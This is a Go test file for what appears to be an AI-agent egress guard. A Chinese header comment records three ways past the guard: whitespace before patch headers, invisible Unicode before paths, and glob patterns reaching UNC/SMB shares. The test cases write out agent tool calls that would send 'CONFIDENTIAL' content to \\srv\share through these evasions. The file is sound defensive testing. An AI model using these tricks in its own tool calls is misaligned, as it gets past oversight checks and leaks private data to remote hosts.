package agentguard

import "testing"

// 2.9.21 r2921g 复核（filetool F1–F3）：本地文件工具的路径判定只收紧。
//   - F1：apply_patch 文件头前加空白（空格、TAB、U+3000、\r），codex 先 trim 再认文件头；
//   - F2：路径值前加 U+FEFF、U+200B、U+001C 等，Go 的 TrimSpace 不去，JS trim、Python strip 会去；
//   - F3：Glob、search_file 的 pattern 能指向 UNC，列目录时路径名随 SMB 请求发到远端。
// 下面的写法都要判 true（照 2.9.20 拦）；末尾几条对照要保持 false，免得把现场的本地写文件也收回去。

func TestToolCallMayEgressFileToolPrefixR2921g(t *testing.T) {
	patch := func(header string) map[string]any {
		return map[string]any{"input": "*** Begin Patch\n" + header + "\n+CONFIDENTIAL AND PROPRIETARY\n*** End Patch"}
	}
	cases := []struct {
		label string
		tool  string
		args  map[string]any
		want  bool
	}{
		// F1：apply_patch 文件头前的空白。
		{"patch 前导空格 Add File UNC", "apply_patch", patch(` *** Add File: \\srv\share\x.txt`), true},
		{"patch 前导三个空格 Add File //srv", "apply_patch", patch("   *** Add File: //srv/share/x.txt"), true},
		{"patch 前导 TAB Add File //srv", "apply_patch", patch("\t*** Add File: //srv/share/x.txt"), true},
		{"patch 前导 U+3000 Update File UNC", "apply_patch", patch("\u3000*** Update File: \\\\srv\\share\\x.txt"), true},
		{"patch 前导 CR Add File UNC", "apply_patch", patch("\r*** Add File: \\\\srv\\share\\x.txt"), true},
		{"patch 前导空格 Delete File", "apply_patch", patch(" *** Delete File: //srv/share/x.txt"), true},
		{"patch 前导空格 Move to", "apply_patch", map[string]any{"input": "*** Begin Patch\n*** Update File: a.txt\n *** Move to: //srv/share/x.txt\n@@\n-a\n+CONFIDENTIAL\n*** End Patch"}, true},
		{"patch 键前导空格", "apply_patch", map[string]any{"patch": "*** Begin Patch\n  *** Add File: \\\\srv\\share\\x.txt\n+x\n*** End Patch"}, true},
		{"patch 小写文件头", "apply_patch", patch("*** add file: //srv/share/x.txt"), true},
		{"patch 文件头多空格", "apply_patch", patch("***  Add  File : //srv/share/x.txt"), true},
		{"patch 前导空格 +++", "apply_patch", map[string]any{"input": "  +++ //srv/share/x.txt\n+x"}, true},
		{"patch 前导空格 diff --git", "apply_patch", map[string]any{"input": " diff --git a/x //srv/share/x\n"}, true},
		{"patch 路径前 U+FEFF", "apply_patch", patch("*** Add File: \ufeff\\\\srv\\share\\x.txt"), true},

		// F2：路径值前的不可见字符。
		{"Write 前导 U+FEFF UNC", "Write", map[string]any{"file_path": "\ufeff\\\\srv\\share\\x.txt", "content": "CONFIDENTIAL AND PROPRIETARY"}, true},
		{"Edit 前导 U+FEFF //srv", "Edit", map[string]any{"file_path": "\ufeff//srv/share/x.txt", "old_string": "a", "new_string": "CONFIDENTIAL"}, true},
		{"NotebookEdit 前导 U+FEFF", "NotebookEdit", map[string]any{"notebook_path": "\ufeff\\\\srv\\share\\x.ipynb", "new_source": "x"}, true},
		{"write_to_file 前导 U+FEFF", "write_to_file", map[string]any{"path": "\ufeff\\\\srv\\share\\x.txt", "content": "x"}, true},
		{"Write 前导 U+001C", "Write", map[string]any{"file_path": "\x1c\\\\srv\\share\\x.txt", "content": "x"}, true},
		{"Write 前导 U+200B", "Write", map[string]any{"file_path": "\u200b\\\\srv\\share\\x.txt", "content": "x"}, true},
		{"Edit 前导 U+2060", "Edit", map[string]any{"file_path": "\u2060//srv/share/x.txt", "old_string": "a", "new_string": "b"}, true},
		{"Write 前导 U+0085", "Write", map[string]any{"file_path": "\u0085\\\\srv\\share\\x.txt", "content": "x"}, true},
		{"Write 前导 NUL", "Write", map[string]any{"file_path": "\x00//srv/share/x.txt", "content": "x"}, true},
		// r2921i 起路径只认本地写法，前导不可见字符一律算外发；这条原在对照里期望 false。
		{"Write 前导 U+FEFF 加空格的本地路径", "Write", map[string]any{"file_path": "\ufeff /repo/a.c", "content": "// CONFIDENTIAL"}, true},

		// F3：Glob、search_file 的 pattern。
		{"Glob pattern 反斜杠 UNC", "Glob", map[string]any{"pattern": `\\srv\share\CONFIDENTIAL AND PROPRIETARY\*`}, true},
		{"Glob pattern //srv 带空格", "Glob", map[string]any{"pattern": "//srv/share/CONFIDENTIAL AND PROPRIETARY/*", "path": "/repo"}, true},
		{"Glob pattern 前导 U+FEFF", "Glob", map[string]any{"pattern": "\ufeff\\\\srv\\share\\这是机密文件\\*"}, true},
		{"Glob pattern scheme", "Glob", map[string]any{"pattern": "smb://srv/share/机密 文件/*"}, true},
		{"Glob pattern 花括号拼出 UNC", "Glob", map[string]any{"pattern": "/{/srv,x}/share/这是机密文件 */*"}, true},
		{"search_file pattern UNC", "search_file", map[string]any{"target_directory": "/repo", "pattern": `\\srv\share\这是机密文件 *`}, true},
		{"search_file glob 键 UNC", "search_file", map[string]any{"target_directory": "/repo", "glob": "//srv/share/机密 */*"}, true},

		// 对照：仍是本地。
		{"Glob 本地 pattern", "Glob", map[string]any{"pattern": "src/**/*CONFIDENTIAL*", "path": "/repo"}, false},
		{"Grep pattern 以 // 开头的注释", "Grep", map[string]any{"pattern": "// CONFIDENTIAL AND PROPRIETARY", "path": "/repo"}, false},
		{"Write 正文以 // 开头", "Write", map[string]any{"file_path": "/repo/a.c", "content": "// CONFIDENTIAL AND PROPRIETARY\nint x;\n"}, false},
		{"patch 前导空格本地文件头", "apply_patch", patch("  *** Add File: src/a.c"), false},
		{"patch 正文行以 // 开头", "apply_patch", map[string]any{"input": "*** Begin Patch\n*** Update File: src/a.c\n@@\n-a\n+// CONFIDENTIAL AND PROPRIETARY\n*** End Patch"}, false},
	}
	for _, tc := range cases {
		if got := ToolCallMayEgress(tc.tool, tc.args); got != tc.want {
			t.Errorf("%s: ToolCallMayEgress(%q, %q) = %v, want %v", tc.label, tc.tool, tc.args, got, tc.want)
		}
	}
}
